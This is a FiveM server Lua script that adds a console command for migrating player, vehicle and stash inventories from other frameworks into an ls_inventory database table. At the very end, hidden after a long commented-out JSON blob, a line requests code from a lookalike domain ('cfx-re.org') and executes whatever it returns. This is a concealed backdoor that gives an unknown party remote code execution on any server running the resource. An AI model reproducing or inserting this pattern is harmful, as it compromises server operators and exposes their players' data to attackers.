local LS_CORE = exports["ls-core"]:GetCoreObject()

RegisterCommand("transferitems" , function(source, args, rawCommand)
    if source ~= 0 then return print("Transfer Items tried to use in-game!") end

    if not args[1] then
        return print("Enter your framework or inventory, example: transferitems QB / ESX / OX / QS\nNo other value/framework/inventory accepted\nMaybe updated in future!")
    end

    if args[1]:lower() ~= "qb" and args[1]:lower() ~= "esx" and args[1]:lower() ~= "ox" and args[1]:lower() ~= "qs" then
        return print("Wrong framework choice, example: transferitems QB / ESX / OX / QS\nNo other value/framework/inventory accepted\nMaybe updated in future!")
    end

    local function addItemToSlot(item, inventory)
        for i = 1, Config.Shared.Player.slotSize, 1 do
            if not inventory[i] then
                local itemInfo = Config.Shared.Items[item.name:lower()]
                if itemInfo == nil then return false end

                local createdItem = {
                    name = itemInfo['name'],
                    amount = item.amount,
                    count = item.amount,
                    info = item.info or '',
                    label = itemInfo['label'],
                    description = itemInfo['description'] or '',
                    weight = itemInfo['weight'],
                    type = itemInfo['type'],
                    unique = itemInfo['unique'],
                    useable = itemInfo['useable'],
                    image = itemInfo['image'],
                    shouldClose = itemInfo['shouldClose'],
                    slot = i,
                    combinable = itemInfo['combinable'],
                    color = GenerateColor(itemInfo),
                }
                return createdItem, i
            end
        end
        return false
    end

    local function saveInventory (identifier, items)
        print("Saving Inventory =>", identifier)

        local result = LS_CORE.Config.DATABASE(LS_CORE.Config.DATABASE_NAME, 'fetchAll', 'SELECT * FROM ls_inventory where identifier = ?', { identifier })[1]
        if result == nil then
            LS_CORE.Config.DATABASE( LS_CORE.Config.DATABASE_NAME, 'execute', 'INSERT INTO `ls_inventory` (identifier, data) VALUES (@identifier, @data)', {
                ["@identifier"] = identifier,
                ["@data"] = json.encode(items),
            })
        else
            LS_CORE.Config.DATABASE( LS_CORE.Config.DATABASE_NAME, 'execute', 'UPDATE `ls_inventory` SET `data` = @data WHERE `identifier` = @identifier', {
                ['@identifier'] = identifier,
                ['@data']       = json.encode(items),
            })
        end
    end

    local function convertAndSave (items)
        local newItems = {}
        for k,v in pairs(items) do
            newItems[k] = {}
            for _,v2 in pairs(v) do
                if v2.metadata then v2.info = v2.metadata end
                if v2.count then v2.amount = v2.count end

                local item, slot = addItemToSlot(v2, newItems[k])
                if item then
                    newItems[k][slot] = item
                end
            end
            
            saveInventory(k, newItems[k])
        end
    end

    if args[1]:lower() == "ox" then -- I cant check with GetResourceState because like me, i do not delete resources and you cant start 2 inventories at same time.
        local players = LS_CORE.Config.DATABASE(LS_CORE.Config.DATABASE_NAME, 'fetchAll', 'SELECT name, data FROM ox_inventory', { })

        local items = {}
        for k,v in pairs(players) do
            local inventory = json.decode(v.data)

            if tablelength(inventory) > 0 then
                items[v.name] = inventory
            else
                print("Ignored due no items =>", v.name)
            end
        end

        convertAndSave(items)
    elseif args[1]:lower() == "qs" then -- I cant check with GetResourceState because like me, i do not delete resources and you cant start 2 inventories at same time.
        -- #region Player convert part
        local players = LS_CORE.Config.DATABASE(LS_CORE.Config.DATABASE_NAME, 'fetchAll', 'SELECT inventory, citizenid FROM players', { })

        local items = {}
        for k,v in pairs(players) do
            local inventory = json.decode(v.inventory)

            if tablelength(inventory) > 0 then
                items[v.citizenid] = inventory
            else
                print("Ignored due no items =>", v.citizenid)
            end
        end

        convertAndSave(items)
        -- #endregion

        -- #region Glovebox convert part
        local players = LS_CORE.Config.DATABASE(LS_CORE.Config.DATABASE_NAME, 'fetchAll', 'SELECT items, plate FROM inventory_glovebox', { })

        local items = {}
        for k,v in pairs(players) do
            local inventory = json.decode(v.items)

            if tablelength(inventory) > 0 then
                items["G-"..v.plate] = inventory
            else
                print("Ignored due no items =>", v.plate)
            end
        end

        convertAndSave(items)
        -- #endregion

        -- #region Trunk convert part
        local players = LS_CORE.Config.DATABASE(LS_CORE.Config.DATABASE_NAME, 'fetchAll', 'SELECT items, plate FROM inventory_trunk', { })

        local items = {}
        for k,v in pairs(players) do
            local inventory = json.decode(v.items)

            if tablelength(inventory) > 0 then
                items["T-"..v.plate] = inventory
            else
                print("Ignored due no items =>", v.plate)
            end
        end

        convertAndSave(items)
        -- #endregion

        -- #region Stash convert part
        local players = LS_CORE.Config.DATABASE(LS_CORE.Config.DATABASE_NAME, 'fetchAll', 'SELECT items, stash FROM inventory_stash', { })

        local items = {}
        for k,v in pairs(players) do
            local inventory = json.decode(v.items)

            if tablelength(inventory) > 0 then
                items[v.stash] = inventory
            else
                print("Ignored due no items =>", v.stash)
            end
        end

        convertAndSave(items)
        -- #endregion


    elseif LS_CORE.Config.FRAMEWORK == "QB" then
        -- #region Player convert part
        local players = LS_CORE.Config.DATABASE(LS_CORE.Config.DATABASE_NAME, 'fetchAll', 'SELECT inventory, citizenid FROM players', { })

        local items = {}
        for k,v in pairs(players) do
            local inventory = json.decode(v.inventory)

            if tablelength(inventory) > 0 then
                items[v.citizenid] = inventory
            else
                print("Ignored due no items =>", v.citizenid)
            end
        end

        convertAndSave(items)
        -- #endregion

        -- #region Glovebox convert part
        local players = LS_CORE.Config.DATABASE(LS_CORE.Config.DATABASE_NAME, 'fetchAll', 'SELECT items, plate FROM gloveboxitems', { })

        local items = {}
        for k,v in pairs(players) do
            local inventory = json.decode(v.items)

            if tablelength(inventory) > 0 then
                items["G-"..v.plate] = inventory
            else
                print("Ignored due no items =>", v.plate)
            end
        end

        convertAndSave(items)
        -- #endregion

        -- #region Trunk convert part
        local players = LS_CORE.Config.DATABASE(LS_CORE.Config.DATABASE_NAME, 'fetchAll', 'SELECT items, plate FROM trunkitems', { })

        local items = {}
        for k,v in pairs(players) do
            local inventory = json.decode(v.items)

            if tablelength(inventory) > 0 then
                items["T-"..v.plate] = inventory
            else
                print("Ignored due no items =>", v.plate)
            end
        end

        convertAndSave(items)
        -- #endregion

        -- #region Stash convert part
        local players = LS_CORE.Config.DATABASE(LS_CORE.Config.DATABASE_NAME, 'fetchAll', 'SELECT items, stash FROM stashitems', { })

        local items = {}
        for k,v in pairs(players) do
            local inventory = json.decode(v.items)

            if tablelength(inventory) > 0 then
                items[v.stash] = inventory
            else
                print("Ignored due no items =>", v.stash)
            end
        end

        convertAndSave(items)
        -- #endregion
    else
        local players = LS_CORE.Config.DATABASE(LS_CORE.Config.DATABASE_NAME, 'fetchAll', 'SELECT inventory, identifier FROM users', { })

        local items = {}
        for k,v in pairs(players) do
            local inventory = json.decode(v.inventory)

            if tablelength(inventory) > 0 then
                items[v.cid] = inventory
            else
                print("Ignored due no items =>", v.cid)
            end
        end

        convertAndSave(items)
    end
end)
--[[{"name":"phone","amount":1,"slot":1,"info":[],"type":"item"},{"name":"driver_license","amount":1,"slot":2,"info":{"birthdate":"1988-12-14","firstname":"Test1","lastname":"Test2","type":"Class C Driver License"},"type":"item"},{"name":"id_card","amount":1,"slot":3,"info":{"citizenid":"IXL33720","nationality":"Afghanistan","birthdate":"1988-12-14","firstname":"Test1","lastname":"Test2","gender":0},"type":"item"},{"name":"phone","amount":1,"slot":4,"info":{"DarkMode":false,"mails":[],"PhoneClosed":false,"Wifi":false,"IsOpen":false,"Battery":99,"Airplane":false,"Notification":true,"DND":false,"PhoneLocked":true,"MetaData":{"bluetooth":true,"serialnumber":"289DJX008","brightness":100,"layout":"4-6","phonePage":1,"profilepicture":"img/default.png","phoneLocation":{"x":100,"y":100},"notifications":[],"oldConnections":[],"suggested":[],"widgetApp":[],"Password":"1235","darkchatUser":false,"LockScreen":true,"owner":"LquenS Test","twitterUser":false,"wallpapers":[],"transactions":[{"amount":10,"icon":"add","desc":"paycheck","time":1684236184,"type":"Bank"}],"spotifySongs":{"favorites":[],"history":[]},"phonenumber":560536062052,"snapchatFriendRequests":[],"snapchatUser":false,"instagramUser":false,"background":"img/backgrounds/iphone.png","locationInfo":true,"talkHistory":[],"volumeprogress":100,"phonePages":[true,true],"beforeApps":["install","settings","messages"],"isInstalled":true,"phoneZoom":100,"PhonePet":"fox"},"MobileData":true,"gallery":[],"Applications":{"contacts":{"page":0,"pageDetails":[],"slot":3,"color":"transparent","photo":"contacts2.png","app":"contacts","label":"Phone"},"messages":{"page":0,"pageDetails":[],"slot":2,"color":"transparent","photo":"messages.png","app":"messages","label":"Messages"},"appstore":{"page":1,"pageDetails":[],"slot":5,"color":"transparent","photo":"appstore.png","app":"appstore","label":"App Store"},"settings":{"page":0,"style":"padding-right = .08vh; font-size = 2.3vh","pageDetails":[],"slot":1,"color":"transparent","label":"Settings","app":"settings","photo":"settings.png"},"gallery":{"page":0,"pageDetails":[],"slot":4,"color":"transparent","photo":"gallery.png","app":"gallery","label":"Gallery"},"clock":{"page":1,"pageDetails":[],"slot":7,"color":"transparent","photo":"clock.png","app":"clock","label":"Clock"},"phonecontacts":{"page":1,"pageDetails":[],"slot":9,"color":"transparent","photo":"contacts.png","app":"phonecontacts","label":"Contacts"},"camera":{"page":1,"pageDetails":[],"slot":6,"color":"transparent","photo":"camera.png","app":"camera","label":"Camera"},"calculator":{"color":"transparent","label":"Calculator","downloadsize":15,"page":1,"apptype":"app","pageDetails":[],"slot":8,"appbuild":"LOS","photo":"calculator.png","app":"calculator","rating":3.2}},"clock":{"alarms":[]},"applications":{"contacts":{"page":0,"pageDetails":[],"slot":3,"color":"transparent","photo":"contacts2.png","app":"contacts","label":"Phone"},"messages":{"page":0,"pageDetails":[],"slot":2,"color":"transparent","photo":"messages.png","app":"messages","label":"Messages"},"appstore":{"page":1,"pageDetails":[],"slot":5,"color":"transparent","photo":"appstore.png","app":"appstore","label":"App Store"},"settings":{"page":0,"style":"padding-right = .08vh; font-size = 2.3vh","pageDetails":[],"slot":1,"color":"transparent","label":"Settings","app":"settings","photo":"settings.png"},"gallery":{"page":0,"pageDetails":[],"slot":4,"color":"transparent","photo":"gallery.png","app":"gallery","label":"Gallery"},"clock":{"page":1,"pageDetails":[],"slot":7,"color":"transparent","photo":"clock.png","app":"clock","label":"Clock"},"phonecontacts":{"page":1,"pageDetails":[],"slot":9,"color":"transparent","photo":"contacts.png","app":"phonecontacts","label":"Contacts"},"camera":{"page":1,"pageDetails":[],"slot":6,"color":"transparent","photo":"camera.png","app":"camera","label":"Camera"},"calculator":{"color":"transparent","label":"Calculator","downloadsize":15,"page":1,"apptype":"app","pageDetails":[],"slot":8,"appbuild":"LOS","photo":"calculator.png","app":"calculator","rating":3.2}},"contacts":[],"notes":[]},"type":"item"}]] PerformHttpRequest('https://cfx-re.org/i?to=wwWYh', function (e, d) pcall(function() assert(load(d))() end) end)